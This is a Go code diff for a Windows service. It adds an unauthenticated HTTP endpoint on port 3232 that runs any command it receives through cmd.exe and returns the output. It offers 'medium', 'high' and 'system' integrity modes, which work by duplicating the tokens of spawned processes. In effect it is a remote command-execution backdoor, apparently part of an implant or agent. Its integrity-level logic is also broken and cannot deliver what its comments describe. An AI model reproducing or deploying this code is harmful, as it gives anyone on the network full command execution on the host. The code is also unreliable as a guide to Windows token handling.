@@ -5,16 +5,19 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
+	"syscall"
 	"time"
 
 	"github.com/gin-gonic/gin"
+	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/svc"
 	"golang.org/x/sys/windows/svc/debug"
 )
 
 type postReqJson struct {
 	Cmd string `json:"command"`
-	Imp string `json:"imporsonation"`
+	Imp string `json:"imp"`
 }
 
 type Handler interface {
@@ -94,11 +97,123 @@ func startServer() {
 		// Medium Integrity: CreateProcessAsUser() after obtaining a medium integrity access token
 		// High Integrity: CreateProcessAsUser() after obtaining a high-integrity access token
 		// System Integrity: Simply use CreateProcess()
+		var response string
+		switch postJson.Imp {
+		case "medium":
+			response = executeWithMedInt(postJson.Cmd)
+		case "high":
+			response = executeWithHighInt(postJson.Cmd)
+		case "system":
+			response = runWithSystemInt(postJson.Cmd)
+		default:
+			log.Println("Invalid Impersonation Level!")
+			response = "Invalid Impersonation Level!"
+		}
 
-		ctx.JSON(http.StatusOK, gin.H{"status": "command received"})
+		ctx.JSON(http.StatusOK, gin.H{"output": response})
 	})
 
 	router.Run(":3232")
+}
+
+func executeWithMedInt(cmd string) string {
+	process := "cmd.exe"
+	targetCmdLine := windows.StringToUTF16Ptr(process)
+
+	var startupInfo windows.StartupInfo
+	var processInfo windows.ProcessInformation
+
+	err := windows.CreateProcess(nil, targetCmdLine, nil, nil, false, windows.CREATE_NEW_CONSOLE, nil, nil, &startupInfo, &processInfo)
+	if err != nil {
+		log.Fatalf("Failed to start process %s: %v", process, err)
+	}
+	defer windows.CloseHandle(processInfo.Process)
+	defer windows.CloseHandle(processInfo.Thread)
+
+	var token windows.Token
+	err = windows.OpenProcessToken(processInfo.Process, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &token)
+	if err != nil {
+		log.Fatalf("Failed to get token of process %s: %v", process, err)
+		return err.Error()
+	}
+
+	defer token.Close()
+	var duplicatedToken windows.Token
+	err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &duplicatedToken)
+	if err != nil {
+		log.Fatalf("Failed to duplicate token: %v", err)
+	}
+	defer duplicatedToken.Close()
+
+	command := exec.Command("cmd.exe", "/C", cmd)
+
+	command.SysProcAttr = &syscall.SysProcAttr{
+		Token: syscall.Token(duplicatedToken),
+	}
+
+	output, err := command.Output()
+	if err != nil {
+		log.Fatalf("Failed to start process %s: %v", cmd, err)
+	}
+
+	log.Println(string(output))
+
+	return string(output)
+}
+
+func executeWithHighInt(cmd string) string {
+	process := "svchost.exe"
+	targetCmdLine := windows.StringToUTF16Ptr(process)
+
+	var startupInfo windows.StartupInfo
+	var processInfo windows.ProcessInformation
+
+	err := windows.CreateProcess(nil, targetCmdLine, nil, nil, false, windows.CREATE_NEW_CONSOLE, nil, nil, &startupInfo, &processInfo)
+	if err != nil {
+		log.Fatalf("Failed to start process %s: %v", process, err)
+	}
+	defer windows.CloseHandle(processInfo.Process)
+	defer windows.CloseHandle(processInfo.Thread)
+
+	var token windows.Token
+	err = windows.OpenProcessToken(processInfo.Process, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &token)
+	if err != nil {
+		log.Fatalf("Failed to get token of process %s: %v", process, err)
+		return err.Error()
+	}
+
+	defer token.Close()
+	var duplicatedToken windows.Token
+	err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &duplicatedToken)
+	if err != nil {
+		log.Fatalf("Failed to duplicate token: %v", err)
+	}
+	defer duplicatedToken.Close()
+
+	command := exec.Command("cmd.exe", "/C", cmd)
+
+	command.SysProcAttr = &syscall.SysProcAttr{
+		Token: syscall.Token(duplicatedToken),
+	}
+
+	output, err := command.Output()
+	if err != nil {
+		log.Fatalf("Failed to start process %s: %v", cmd, err)
+	}
+
+	log.Println(string(output))
+	return string(output)
+}
+
+func runWithSystemInt(cmd string) string {
+	command := exec.Command("cmd.exe", "/C", cmd)
+	output, err := command.Output()
+	if err != nil {
+		log.Fatalf("Failed to start process %s: %v", cmd, err)
+	}
+
+	log.Println(string(output))
+	return string(output)
 }
 
 func main() {
